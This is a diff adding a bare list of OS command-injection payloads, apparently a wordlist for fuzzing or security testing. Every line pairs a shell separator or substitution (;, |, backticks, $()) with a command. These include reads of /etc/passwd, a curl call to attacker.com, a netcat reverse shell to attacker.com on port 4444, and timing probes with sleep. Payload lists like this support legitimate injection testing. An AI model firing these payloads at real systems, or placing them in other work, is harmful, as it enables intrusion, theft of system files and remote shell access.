@@ -1,0 +1,31 @@
+; ls
+| ls
+|| ls
+`ls`
+$(ls)
+; cat /etc/passwd
+| cat /etc/passwd
+|| cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; id
+| id
+`id`
+$(id)
+; whoami
+| whoami
+`whoami`
+$(whoami)
+; ping -c 3 127.0.0.1
+| ping -c 3 127.0.0.1
+`ping -c 3 127.0.0.1`
+; curl http://attacker.com
+| curl http://attacker.com
+; sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+; nc -e /bin/sh attacker.com 4444
+| nc -e /bin/sh attacker.com 4444
+; echo YmFzZTY0 | base64 -d
+| echo YmFzZTY0 | base64 -d
